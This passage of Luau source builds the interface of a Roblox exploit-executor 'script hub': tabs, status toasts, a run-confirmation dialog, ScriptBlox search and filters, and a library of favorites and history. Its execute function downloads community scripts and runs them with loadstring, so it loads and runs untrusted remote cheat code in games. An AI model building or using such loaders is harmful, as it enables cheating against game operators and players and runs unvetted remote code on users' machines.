	}, statusBar)
	round(statusDot, 4)
	local statusText = label(statusBar, {
		Size = UDim2.new(1, -66, 1, 0),
		Position = UDim2.fromOffset(30, 0),
		Text = "Ready",
		TextSize = 11,
		TextColor3 = C.sub,
		TextTruncate = Enum.TextTruncate.AtEnd,
	})
	local function setStatus(text, color)
		statusText.Text = text
		tw(statusDot, { BackgroundColor3 = color or C.green }, 0.2)
	end
	hub.setStatus = setStatus

	-- avisos emergentes (errores y scripts ejecutados)
	local toastBox = new("Frame", {
		Size = UDim2.fromOffset(0, 30), AutomaticSize = Enum.AutomaticSize.X,
		AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, -(STATUS_H + 10)),
		BackgroundColor3 = C.card2, BackgroundTransparency = 1, BorderSizePixel = 0, Visible = false, ZIndex = 30,
	}, H.win)
	round(toastBox, 15)
	K.padding(toastBox, 14, 0, 14, 0)
	local toastText = label(toastBox, {
		Size = UDim2.fromOffset(0, 30), AutomaticSize = Enum.AutomaticSize.X, Text = "", TextSize = 12,
		TextTransparency = 1, TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 31,
	})
	local toastId = 0
	local function toast(text, color)
		if not settings.toasts then return end
		toastId += 1
		local id = toastId
		text = tostring(text)
		if #text > 60 then text = text:sub(1, 57) .. "..." end
		toastText.Text = text
		toastText.TextColor3 = color or C.text
		toastBox.Visible = true
		tw(toastBox, { BackgroundTransparency = 0.05 }, 0.15)
		tw(toastText, { TextTransparency = 0 }, 0.15)
		task.delay(2.4, function()
			if id ~= toastId or not hub.alive then return end
			tw(toastBox, { BackgroundTransparency = 1 }, 0.25)
			tw(toastText, { TextTransparency = 1 }, 0.25)
			task.delay(0.3, function()
				if id == toastId and toastBox.Parent then toastBox.Visible = false end
			end)
		end)
	end
	hub.toast = toast
	local baseSetStatus = setStatus
	setStatus = function(text, color)
		baseSetStatus(text, color)
		if color == C.red or string.find(tostring(text), "^Executed") then toast(text, color) end
	end
	hub.setStatus = setStatus

	-- ---------- tabs ----------
	local tabBar = new("Frame", { Size = UDim2.new(1, 0, 0, TABS_H), BackgroundTransparency = 1 }, H.content)
	new("Frame", {
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, -1),
		BackgroundColor3 = C.line,
		BorderSizePixel = 0,
	}, tabBar)
	local indicator = new("Frame", {
		Size = UDim2.new(1 / 6, -16, 0, 2),
		Position = UDim2.new(0, 8, 0, TABS_H - 2),
		BackgroundColor3 = C.accent,
		BorderSizePixel = 0,
		ZIndex = 2,
	}, tabBar)
	round(indicator, 1)

	local pagesHolder = new("Frame", {
		Size = UDim2.new(1, 0, 1, -TABS_H - STATUS_H),
		Position = UDim2.fromOffset(0, TABS_H),
		BackgroundTransparency = 1,
	}, H.content)

	local function newScroll(visible)
		local p = new("ScrollingFrame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			ScrollBarThickness = 3,
			ScrollBarImageColor3 = C.line,
			CanvasSize = UDim2.fromScale(0, 0),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			Visible = visible or false,
		}, pagesHolder)
		K.padding(p, 12, 12, 12, 12)
		new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }, p)
		return p
	end

	local pages, tabButtons = {}, {}
	local onTabSelected = {}
	local function selectTab(name)
		for n, page in pages do
			page.Visible = (n == name)
			tabButtons[n].TextColor3 = (n == name) and C.text or C.sub
		end
		hub.tab = name
		if hub.cancelCapture then hub.cancelCapture() end
		tw(indicator, { Position = UDim2.new(tabButtons[name].Position.X.Scale, 8, 0, TABS_H - 2) }, 0.22, Enum.EasingStyle.Quint)
		if onTabSelected[name] then onTabSelected[name]() end
	end
	local function registerTab(name, index, page)
		pages[name] = page
		local b = new("TextButton", {
			Size = UDim2.new(1 / 6, 0, 0, TABS_H - 2),
			Position = UDim2.new((index - 1) / 6, 0, 0, 0),
			BackgroundTransparency = 1,
			Text = name,
			Font = Enum.Font.GothamMedium,
			TextSize = 12,
			TextColor3 = C.sub,
			AutoButtonColor = false,
		}, tabBar)
		b.MouseButton1Click:Connect(function() selectTab(name) end)
		tabButtons[name] = b
	end

	local home = newScroll()
	registerTab("Home", 1, home)
	local scriptsPage = new("Frame", {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		Visible = false,
	}, pagesHolder)
	registerTab("Scripts", 2, scriptsPage)
	local library = newScroll()
	registerTab("Library", 3, library)
	local toolsPage = newScroll()
	registerTab("Tools", 4, toolsPage)
	local musicPage = newScroll()
	registerTab("Music", 5, musicPage)
	local settingsPage = newScroll()
	registerTab("Settings", 6, settingsPage)

	-- ---------- confirmacion ----------
	local overlay = new("Frame", {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.35,
		Visible = false,
		ZIndex = 50,
		Active = true,
	}, H.win)
	local dialog = new("Frame", {
		Size = UDim2.new(1, -56, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		BackgroundColor3 = C.card,
		BorderSizePixel = 0,
	}, overlay)
	round(dialog, 14)
	K.outline(dialog, C.line)
	K.padding(dialog, 16, 16, 16, 16)
	new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }, dialog)
	local dialogTitle = label(dialog, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = 1,
		Font = Enum.Font.GothamBold, TextSize = 14, TextWrapped = true,
	})
	local dialogBody = label(dialog, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = 2,
		TextSize = 11, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
	})
	local dialogButtons = new("Frame", { Size = UDim2.new(1, 0, 0, 34), BackgroundTransparency = 1, LayoutOrder = 3 }, dialog)
	local cancelBtn = new("TextButton", {
		Size = UDim2.new(0.5, -4, 1, 0), BackgroundColor3 = C.card2, Text = "Cancel", TextColor3 = C.text,
		Font = Enum.Font.GothamMedium, TextSize = 13, AutoButtonColor = false,
	}, dialogButtons)
	round(cancelBtn, 10)
	K.hover(cancelBtn, C.card2, C.line)
	local okBtn = new("TextButton", {
		Size = UDim2.new(0.5, -4, 1, 0), Position = UDim2.new(0.5, 4, 0, 0), BackgroundColor3 = C.accent,
		Text = "Run", TextColor3 = C.onAccent, Font = Enum.Font.GothamBold, TextSize = 13, AutoButtonColor = false,
	}, dialogButtons)
	round(okBtn, 10)
	K.hover(okBtn, C.accent, C.accent2)

	local pendingYes
	local function confirm(titleText, bodyText, onYes)
		dialogTitle.Text = titleText
		dialogBody.Text = bodyText
		pendingYes = onYes
		overlay.Visible = true
	end
	cancelBtn.MouseButton1Click:Connect(function()
		overlay.Visible = false
		pendingYes = nil
	end)
	okBtn.MouseButton1Click:Connect(function()
		overlay.Visible = false
		local fn = pendingYes
		pendingYes = nil
		if fn then fn() end
	end)

	-- ---------- ejecutar ----------
	local busy = false
	local function execute(entry)
		if busy then return end
		busy = true
		task.spawn(function()
			local function finish(msg, color)
				setStatus(msg, color)
				busy = false
			end

			if entry.run then
				local ok, err = pcall(entry.run)
				return finish(ok and ("Executed: " .. entry.name) or ("Error: " .. tostring(err)), ok and C.green or C.red)
			end

			if not loadstring then return finish("Your executor does not support loadstring", C.red) end

			setStatus("Loading " .. entry.name .. "...", C.amber)
			local code, err = K.resolveCode(entry)
			if not code then return finish("Download failed: " .. tostring(err), C.red) end

			local fn, compileErr = loadstring(code)
			if not fn then return finish("Script error: " .. tostring(compileErr), C.red) end

			-- FIX: el script corre en su propio hilo. Antes, un script con bucle infinito en el nivel
			-- principal dejaba el hub en "Loading" y bloqueaba todos los botones para siempre.
			local finished, timedOut, ok, runErr = false, false, true, nil
			task.spawn(function()
				ok, runErr = pcall(fn)
				finished = true
				if not ok and timedOut and hub.alive then
					setStatus("Runtime error: " .. tostring(runErr), C.red)
				end
			end)
			local t0 = os.clock()
			while not finished and os.clock() - t0 < 1.5 do task.wait() end
			timedOut = not finished
			if finished and not ok then return finish("Runtime error: " .. tostring(runErr), C.red) end

			if entry.sb then
				K.addHistory(entry.sb)
				if entry.sb.key then
					return finish("Executed: " .. entry.name .. "  (key system: it may ask for a key)", C.amber)
				end
			end
			finish("Executed: " .. entry.name, C.green)
		end)
	end

	local function runScriptBlox(item)
		local entry = { name = item.title or "script", sb = item }
		local function go() execute(entry) end
		if not settings.askBeforeRun then return go() end

		local lines = {}
		if item.verified then
			table.insert(lines, "✓ Verified by ScriptBlox.")
		else
			table.insert(lines, "⚠ This script is NOT verified.")
		end
		if item.key then table.insert(lines, "🔑 It uses a key system.") end
		if item.isPatched then table.insert(lines, "⛔ It is marked as patched (may not work).") end
		table.insert(lines, "Community scripts are written by third parties and run with full access in your executor. Only run scripts you trust.")
		confirm('Run "' .. tostring(item.title) .. '"?', table.concat(lines, "\n"), go)
	end

	-- ============================== HOME ==============================
	local profile = K.card(home, 78, 1)
	local avatar = new("ImageLabel", {
		Size = UDim2.fromOffset(54, 54),
		Position = UDim2.fromOffset(12, 12),
		BackgroundColor3 = C.card2,
		Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(player.UserId),
		BorderSizePixel = 0,
	}, profile)
	round(avatar, 27)
	K.outline(avatar, C.accent, 2)
	label(profile, {
		Position = UDim2.fromOffset(78, 13), Size = UDim2.new(1, -90, 0, 18),
		Text = player.DisplayName, Font = Enum.Font.GothamBold, TextSize = 15,
		TextTruncate = Enum.TextTruncate.AtEnd,
	})
	label(profile, {
		Position = UDim2.fromOffset(78, 32), Size = UDim2.new(1, -90, 0, 14),
		Text = "@" .. player.Name, TextColor3 = C.accent2, TextSize = 12,
	})
	label(profile, {
		Position = UDim2.fromOffset(78, 50), Size = UDim2.new(1, -90, 0, 14),
		Text = ("ID %d   •   %d days old   •   %s"):format(player.UserId, player.AccountAge, executorName),
		TextColor3 = C.sub, TextSize = 10, TextTruncate = Enum.TextTruncate.AtEnd,
	})

	local gameCard = K.card(home, 78, 2)
	local gameIcon = new("ImageLabel", {
		Size = UDim2.fromOffset(54, 54),
		Position = UDim2.fromOffset(12, 12),
		BackgroundColor3 = C.card2,
		Image = ("rbxthumb://type=GameIcon&id=%d&w=150&h=150"):format(game.GameId),
		BorderSizePixel = 0,
	}, gameCard)
	round(gameIcon, 12)
	if currentEntry and currentEntry.icon ~= nil then
		local img, url = K.iconSource(currentEntry)
		gameIcon.Image = img
		K.loadIconInto(gameIcon, url)
	end
	local gameNameLabel = label(gameCard, {
		Position = UDim2.fromOffset(78, 13), Size = UDim2.new(1, -90, 0, 18),
		Text = gameName, Font = Enum.Font.GothamBold, TextSize = 14,
		TextTruncate = Enum.TextTruncate.AtEnd,
	})
	label(gameCard, {
		Position = UDim2.fromOffset(78, 32), Size = UDim2.new(1, -90, 0, 14),
		Text = ("PlaceId %d   •   GameId %d"):format(game.PlaceId, game.GameId),
		TextColor3 = C.sub, TextSize = 10, TextTruncate = Enum.TextTruncate.AtEnd,
	})
	local badge = new("TextLabel", {
		Position = UDim2.fromOffset(78, 50),
		Size = UDim2.fromOffset(0, 18),
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundColor3 = currentEntry and Color3.fromRGB(24, 64, 44) or Color3.fromRGB(70, 52, 20),
		Text = currentEntry
			and ("●  " .. #currentEntry.scripts .. " custom script" .. (#currentEntry.scripts > 1 and "s" or "") .. " for this game")
			or "●  No custom script for this game",
		TextColor3 = currentEntry and C.green or C.amber,
		Font = Enum.Font.GothamMedium,
		TextSize = 10,
	}, gameCard)
	round(badge, 9)
	K.padding(badge, 8, 0, 8, 0)

	local statsHolder = new("Frame", { Size = UDim2.new(1, 0, 0, 56), BackgroundTransparency = 1, LayoutOrder = 3 }, home)
	new("UIGridLayout", {
		CellSize = UDim2.new(0.25, -6, 0, 56),
		CellPadding = UDim2.fromOffset(8, 8),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, statsHolder)

	local function tile(titleText, order)
		local t = new("Frame", { BackgroundColor3 = C.card, BorderSizePixel = 0, LayoutOrder = order }, statsHolder)
		round(t, 10)
		K.outline(t, C.line)
		label(t, {
			Position = UDim2.fromOffset(10, 8), Size = UDim2.new(1, -16, 0, 12),
			Text = titleText, Font = Enum.Font.GothamMedium, TextSize = 10, TextColor3 = C.sub,
		})
		return label(t, {
			Position = UDim2.fromOffset(10, 25), Size = UDim2.new(1, -16, 0, 22),
			Text = "--", Font = Enum.Font.GothamBold, TextSize = 15,
		})
	end
	local fpsValue = tile("FPS", 1)
	local pingValue = tile("PING", 2)
	local playersValue = tile("PLAYERS", 3)
	local uptimeValue = tile("UPTIME", 4)

	local function actionButton(parent, order, text, primary)
		local b = new("TextButton", {
			Size = UDim2.new(1, 0, 0, 46),
			BackgroundColor3 = primary and C.white or C.card2,
			Text = text,
			TextColor3 = primary and C.onAccent or C.text,
			Font = Enum.Font.GothamBold,
			TextSize = 14,
			AutoButtonColor = false,
			LayoutOrder = order,
		}, parent)
		round(b, 12)
		local grad
		if primary then
			grad = K.gradient(b, C.accent, C.accent2, 0)
			b.MouseEnter:Connect(function() tw(b, { BackgroundTransparency = 0.15 }, 0.12) end)
			b.MouseLeave:Connect(function() tw(b, { BackgroundTransparency = 0 }, 0.12) end)
		else
			K.outline(b, C.line)
			K.hover(b, C.card2, C.line)
		end
		return b, grad
	end

	if currentEntry and #currentEntry.scripts > 0 then
		for i, s in currentEntry.scripts do
			local b = actionButton(home, 3 + i, "▶   " .. s.name, i == 1)
			b.MouseButton1Click:Connect(function() execute(K.scriptEntry(currentEntry, s)) end)
		end
	else
		local b, grad = actionButton(home, 4, "No custom script registered for this game", true)
		grad.Enabled = false
		b.BackgroundColor3 = C.card2
		b.TextColor3 = C.sub
		b.TextSize = 12
		K.outline(b, C.line)
	end

	local browseBtn = actionButton(home, 100, "🔎   Find scripts for this game on ScriptBlox", false)
	local uniBtn = actionButton(home, 101, "⚡   Run universal script", false)
	uniBtn.MouseButton1Click:Connect(function() execute(UNIVERSAL) end)

	local function keyName()
		local ok, k = pcall(function() return Enum.KeyCode[settings.hubKey] end)
		return ok and k or Enum.KeyCode.RightControl
	end
	local hintLabel = label(home, {
		Size = UDim2.new(1, 0, 0, 16), LayoutOrder = 102,
		Text = "[" .. keyName().Name .. "] hide / show this hub",
		TextColor3 = C.sub, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Center,
	})

	-- ============================ SCRIPTS (ScriptBlox) ============================
	local TOP_H = 114
	local top = new("Frame", { Size = UDim2.new(1, 0, 0, TOP_H), BackgroundTransparency = 1 }, scriptsPage)
	K.padding(top, 12, 10, 12, 0)

	local searchRow = new("Frame", { Size = UDim2.new(1, 0, 0, 36), BackgroundTransparency = 1 }, top)
	local searchBox = new("TextBox", {
		Size = UDim2.new(1, -84, 1, 0),
		BackgroundColor3 = C.card,
		Text = S.query,
		PlaceholderText = "Search ScriptBlox…",
		PlaceholderColor3 = C.sub,
		TextColor3 = C.text,
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextXAlignment = Enum.TextXAlignment.Left,
		ClearTextOnFocus = false,
	}, searchRow)
	round(searchBox, 10)
	K.outline(searchBox, C.line)
	K.padding(searchBox, 12, 0, 12, 0)
	local searchBtn = new("TextButton", {
		Size = UDim2.fromOffset(74, 36),
		Position = UDim2.new(1, -74, 0, 0),
		BackgroundColor3 = C.white,
		Text = "Search",
		TextColor3 = C.onAccent,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		AutoButtonColor = false,
	}, searchRow)
	round(searchBtn, 10)
	K.gradient(searchBtn, C.accent, C.accent2, 0)

	local chipRow = new("Frame", { Size = UDim2.new(1, 0, 0, 24), Position = UDim2.fromOffset(0, 44), BackgroundTransparency = 1 }, top)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder,
	}, chipRow)

	local sourceRow = new("Frame", { Size = UDim2.new(1, 0, 0, 24), Position = UDim2.fromOffset(0, 76), BackgroundTransparency = 1 }, top)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder,
	}, sourceRow)

	local resultsScroll = new("ScrollingFrame", {
		Size = UDim2.new(1, 0, 1, -TOP_H),
		Position = UDim2.fromOffset(0, TOP_H),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 3,
		ScrollBarImageColor3 = C.line,
		CanvasSize = UDim2.fromScale(0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	}, scriptsPage)
	K.padding(resultsScroll, 12, 4, 12, 12)
	new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, resultsScroll)

	local function showMessage(text, color)
		K.clearChildren(resultsScroll)
		label(resultsScroll, {
			Size = UDim2.new(1, 0, 0, 60),
			Text = text,
			TextColor3 = color or C.sub,
			TextSize = 12,
			TextWrapped = true,
			TextXAlignment = Enum.TextXAlignment.Center,
		})
	end

	hub.showMessage = showMessage

	local function pill(parent, text, bg, fg)
		local p = new("TextLabel", {
			Size = UDim2.fromOffset(0, 16),
			AutomaticSize = Enum.AutomaticSize.X,
			BackgroundColor3 = bg,
			Text = text,
			TextColor3 = fg,
			Font = Enum.Font.GothamMedium,
			TextSize = 9,
		}, parent)
		round(p, 8)
		K.padding(p, 7, 0, 7, 0)
		return p
	end

	local function scriptCard(parent, item, order)
		local c = K.card(parent, 84, order)
		local gname = (item.game and item.game.name) or (item.isUniversal and "Universal" or "Unknown game")
		local tint = K.hashColor(gname)

		local tileFrame = new("Frame", {
			Size = UDim2.fromOffset(46, 46), Position = UDim2.fromOffset(12, 12),
			BackgroundColor3 = tint, BorderSizePixel = 0,
		}, c)
		round(tileFrame, 12)
		label(tileFrame, {
			Size = UDim2.fromScale(1, 1), Text = K.firstChar(gname),
			Font = Enum.Font.GothamBold, TextSize = 20, TextXAlignment = Enum.TextXAlignment.Center,
			TextColor3 = C.white,
		})

		label(c, {
			Position = UDim2.fromOffset(70, 10), Size = UDim2.new(1, -170, 0, 16),
			Text = tostring(item.title), Font = Enum.Font.GothamBold, TextSize = 13,
			TextTruncate = Enum.TextTruncate.AtEnd,
		})
		label(c, {
			Position = UDim2.fromOffset(70, 29), Size = UDim2.new(1, -170, 0, 13),
			Text = gname .. "  •  " .. K.formatViews(item.views) .. " views",
			TextSize = 10, TextColor3 = C.sub, TextTruncate = Enum.TextTruncate.AtEnd,
		})

		local badges = new("Frame", {
			Position = UDim2.fromOffset(70, 52), Size = UDim2.new(1, -170, 0, 16), BackgroundTransparency = 1,
		}, c)
		new("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 4) }, badges)
		if item.verified then pill(badges, "✓ Verified", Color3.fromRGB(24, 64, 44), C.green) end
		if item.key then pill(badges, "Key", Color3.fromRGB(70, 52, 20), C.amber) end
		if item.isUniversal then pill(badges, "Universal", Color3.fromRGB(30, 46, 84), C.accent2) end
		if item.isPatched then pill(badges, "Patched", Color3.fromRGB(80, 30, 30), C.red) end

		local run = new("TextButton", {
			Size = UDim2.fromOffset(72, 28), AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, -12, 0, 12), BackgroundColor3 = C.accent,
			Text = "▶ Run", TextColor3 = C.onAccent, Font = Enum.Font.GothamBold, TextSize = 12, AutoButtonColor = false,
		}, c)
		round(run, 8)
		K.hover(run, C.accent, C.accent2)
		run.MouseButton1Click:Connect(function() runScriptBlox(item) end)

		local copy = new("TextButton", {
			Size = UDim2.fromOffset(40, 24), AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, -12, 0, 50), BackgroundColor3 = C.card2,
			Text = "Copy", TextColor3 = C.sub, Font = Enum.Font.GothamMedium, TextSize = 10, AutoButtonColor = false,
		}, c)
		round(copy, 8)
		K.hover(copy, C.card2, C.line)
		copy.MouseButton1Click:Connect(function()
			task.spawn(function()
				if not setclipboard then return setStatus("Your executor does not support clipboard", C.red) end
				setStatus("Copying script...", C.amber)
				local code, err = K.resolveCode({ sb = item })
				if code then
					setclipboard(code)
					setStatus("Script copied to clipboard", C.green)
				else
					setStatus("Copy failed: " .. tostring(err), C.red)
				end
			end)
		end)

		local star = new("TextButton", {
			Size = UDim2.fromOffset(28, 24), AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, -58, 0, 50), BackgroundColor3 = C.card2,
			Text = "★", Font = Enum.Font.GothamBold, TextSize = 13, AutoButtonColor = false,
		}, c)
		round(star, 8)
		K.hover(star, C.card2, C.line)
		local function paintStar()
			star.TextColor3 = K.isFav(item.slug) and C.amber or C.sub
		end
		paintStar()
		star.MouseButton1Click:Connect(function()
			local now = K.toggleFav(item)
			paintStar()
			setStatus(now and "Added to favorites" or "Removed from favorites", C.green)
		end)
	end

	local function renderResults()
		K.clearChildren(resultsScroll)
		if #S.results == 0 then
			return showMessage("No scripts found.\nTry another search or change the filters.")
		end
		for i, item in S.results do
			scriptCard(resultsScroll, item, i)
		end
		if S.mode ~= "trending" and S.page < S.totalPages then
			local more = new("TextButton", {
				Size = UDim2.new(1, 0, 0, 36), BackgroundColor3 = C.card2, Text = "Load more…",
				TextColor3 = C.text, Font = Enum.Font.GothamMedium, TextSize = 12, AutoButtonColor = false,
				LayoutOrder = 100000,
			}, resultsScroll)
			round(more, 10)
			K.outline(more, C.line)
			K.hover(more, C.card2, C.line)
			more.MouseButton1Click:Connect(function()
				S.page += 1
				hub.runQuery(false)
			end)
		end
	end

	hub.renderResults = renderResults

	function hub.runQuery(reset)
		S.request += 1
		local id = S.request
		S.loaded = true
		if reset then
			S.page = 1
			S.results = {}
		end
		if S.mode == "search" and S.query == "" then S.mode = "trending" end
		if hub.refreshModes then hub.refreshModes() end
		if reset then showMessage("Loading…") end
		setStatus("Searching ScriptBlox...", C.amber)
		S.inflight = true

		task.spawn(function()
			local list, totalPages, err = K.queryScripts(S)
			if id ~= S.request then return end
			S.inflight = false
			-- FIX: si la interfaz se reconstruyo mientras cargaba, el resultado se dibuja en la actual
			local live = currentHub or hub
			if not list then
				-- FIX: si falla "Load more", la pagina no se salta
				if not reset and S.page > 1 then S.page -= 1 end
				if reset then pcall(live.showMessage, "Error: " .. tostring(err), C.red) end
				return pcall(live.setStatus, "ScriptBlox error: " .. tostring(err), C.red)
			end
			for _, item in list do table.insert(S.results, item) end
			S.totalPages = totalPages
			local okR, errR = pcall(live.renderResults)
			if not okR then pcall(live.showMessage, "Display error: " .. tostring(errR), C.red) end
			pcall(live.setStatus, ("%d scripts loaded"):format(#S.results), C.green)
		end)
	end

	-- filtros
	local FILTERS = {
		{ "verified", "✓ Verified", 74 }, { "free", "Free", 50 }, { "nokey", "No key", 60 },
		{ "universal", "Universal", 70 }, { "unpatched", "Unpatched", 76 },
	}
	for i, f in FILTERS do
		local key = f[1]
		local b = makeChip(chipRow, f[2], f[3], S.filters[key], function(set)
			S.filters[key] = not S.filters[key]
			set(S.filters[key])
			hub.runQuery(true)
		end)
		b.LayoutOrder = i
	end

	-- origen: trending / este juego / orden
	local modeSetters = {}
	local function modeChip(text, width, mode, order)
		local b, set = makeChip(sourceRow, text, width, S.mode == mode, function()
			S.mode = mode
			hub.runQuery(true)
		end)
		b.LayoutOrder = order
		modeSetters[mode] = set
	end
	modeChip("🔥 Trending", 92, "trending", 1)
	modeChip("🎮 This game", 98, "game", 2)

	local sortBtn
	sortBtn = makeChip(sourceRow, "Sort: " .. K.SORTS[S.sortIndex][2], 110, false, function(set)
		S.sortIndex = S.sortIndex % #K.SORTS + 1
		S.sort = K.SORTS[S.sortIndex][1]
		set(false)
		sortBtn.Text = "Sort: " .. K.SORTS[S.sortIndex][2]
		if S.mode ~= "trending" then hub.runQuery(true) end
	end)
	sortBtn.LayoutOrder = 3
	S.sort = K.SORTS[S.sortIndex][1]

	function hub.refreshModes()
		for mode, set in modeSetters do set(S.mode == mode) end
	end

	local function doSearch()
		S.query = (searchBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
		S.mode = S.query ~= "" and "search" or "trending"
		hub.runQuery(true)
	end
	searchBtn.MouseButton1Click:Connect(doSearch)
	searchBox.FocusLost:Connect(function(enter) if enter then doSearch() end end)

	browseBtn.MouseButton1Click:Connect(function()
		S.mode = "game"
		selectTab("Scripts")
		hub.runQuery(true)
	end)

	if #S.results > 0 then
		renderResults()
	elseif S.inflight then
		showMessage("Loading…")
	else
		showMessage("Search for any script above,\nor browse what is trending right now.")
	end
	onTabSelected["Scripts"] = function()
		if not S.loaded then hub.runQuery(true) end
	end

	-- ============================== LIBRARY ==============================
	local function libraryCard(parent, order, opts)
		local c = K.card(parent, 64, order)
		local icon = new("ImageLabel", {
			Size = UDim2.fromOffset(40, 40), Position = UDim2.fromOffset(12, 12),
			BackgroundColor3 = opts.iconText and C.white or (opts.tint or C.card2),
			Image = opts.image or "", BorderSizePixel = 0,
		}, c)
		round(icon, 10)
		K.loadIconInto(icon, opts.iconUrl)
		if opts.iconText then
			K.gradient(icon, C.accent, C.accent2, 45)
		end
		if opts.iconText or opts.tintLetter then
			label(icon, {
				Size = UDim2.fromScale(1, 1), Text = opts.iconText or opts.tintLetter,
				Font = Enum.Font.GothamBold, TextSize = 18, TextXAlignment = Enum.TextXAlignment.Center,
				TextColor3 = opts.iconText and C.onAccent or C.white,
			})
		end
		local rightPad = opts.onRemove and 150 or 120
		label(c, {
			Position = UDim2.fromOffset(62, 13), Size = UDim2.new(1, -rightPad, 0, 18),
			Text = opts.name, Font = Enum.Font.GothamBold, TextSize = 13,
			TextTruncate = Enum.TextTruncate.AtEnd,
		})
		label(c, {
			Position = UDim2.fromOffset(62, 33), Size = UDim2.new(1, -rightPad, 0, 14),
			Text = opts.sub, TextSize = 10, TextColor3 = opts.subColor or C.sub,
			TextTruncate = Enum.TextTruncate.AtEnd,
		})
		local run = new("TextButton", {
			Size = UDim2.fromOffset(72, 30), AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(1, -12, 0.5, 0),
			BackgroundColor3 = opts.enabled and C.accent or C.card2,
			Text = opts.enabled and "▶ Run" or "Not here",
			TextColor3 = opts.enabled and C.onAccent or C.sub,
			Font = Enum.Font.GothamBold, TextSize = 12, AutoButtonColor = false,
		}, c)
		round(run, 8)
		if opts.enabled then
			K.hover(run, C.accent, C.accent2)
			run.MouseButton1Click:Connect(opts.onRun)
		end
		if opts.onRemove then
			local rm = new("TextButton", {
				Size = UDim2.fromOffset(30, 30), AnchorPoint = Vector2.new(1, 0.5),
				Position = UDim2.new(1, -90, 0.5, 0), BackgroundColor3 = C.card2,
				Text = "✕", TextColor3 = C.sub, Font = Enum.Font.GothamBold, TextSize = 12, AutoButtonColor = false,
			}, c)
			round(rm, 8)
			K.hover(rm, C.card2, C.red)
			rm.MouseButton1Click:Connect(opts.onRemove)
		end
	end

	local function sectionTitle(parent, order, text)
		label(parent, {
			Size = UDim2.new(1, 0, 0, 16), LayoutOrder = order, Text = string.upper(text),
			Font = Enum.Font.GothamBold, TextSize = 11, TextColor3 = C.accent,
		})
	end

	local renderLibrary
	local function slugEntry(item)
		return { name = item.title, sb = { slug = item.slug, title = item.title, gameLabel = item.game } }
	end

	renderLibrary = function()
		K.clearChildren(library)
		local n = K.sequence()

		sectionTitle(library, n(), "Built-in")
		libraryCard(library, n(), {
			name = UNIVERSAL.name, sub = "Works in any game", iconText = "⚡", enabled = true,
			onRun = function() execute(UNIVERSAL) end,
		})
		for _, entry in GAMES do
			local isCurrent = entry == currentEntry
			for _, s in entry.scripts do
				local img, imgUrl = K.iconSource(entry, s)
				libraryCard(library, n(), {
					name = s.name,
					sub = isCurrent and ("● " .. entry.name .. " - you are here")
						or (entry.name .. "  •  " .. (s.desc or ("GameId " .. tostring((entry.gameIds or {})[1] or "?")))),
					subColor = isCurrent and C.green or C.sub,
					image = img,
					iconUrl = imgUrl,
					enabled = isCurrent,
					onRun = function() execute(K.scriptEntry(entry, s)) end,
				})
			end
		end

		sectionTitle(library, n(), "Favorites")
		if #settings.favorites == 0 then
			label(library, {
				Size = UDim2.new(1, 0, 0, 30), LayoutOrder = n(),
				Text = "No favorites yet. Tap ★ on any script in the Scripts tab.",
				TextColor3 = C.sub, TextSize = 11, TextWrapped = true,
			})
		end
		for _, fav in settings.favorites do
			libraryCard(library, n(), {
				name = fav.title or "script", sub = fav.game or "ScriptBlox",
				tint = K.hashColor(fav.game or "x"), tintLetter = K.firstChar(fav.game or "S"),
				enabled = true,
				onRun = function()
					execute(slugEntry(fav))
				end,
				onRemove = function()
					K.toggleFav(fav)
					renderLibrary()
				end,
			})
		end

		sectionTitle(library, n(), "Recent")
		if #settings.history == 0 then
			label(library, {
				Size = UDim2.new(1, 0, 0, 30), LayoutOrder = n(),
				Text = "Scripts you run from ScriptBlox will show up here.",
				TextColor3 = C.sub, TextSize = 11, TextWrapped = true,
			})
		end
		for _, h in settings.history do
			libraryCard(library, n(), {
				name = h.title or "script", sub = h.game or "ScriptBlox",
				tint = K.hashColor(h.game or "x"), tintLetter = K.firstChar(h.game or "S"),
				enabled = true,
				onRun = function() execute(slugEntry(h)) end,
			})
		end
	end
	onTabSelected["Library"] = renderLibrary

	-- favoritos en Home: acceso rapido a tus 4 primeros favoritos
	local homeFavCard
	local function renderHomeFavs()
		if not hub.alive then return end
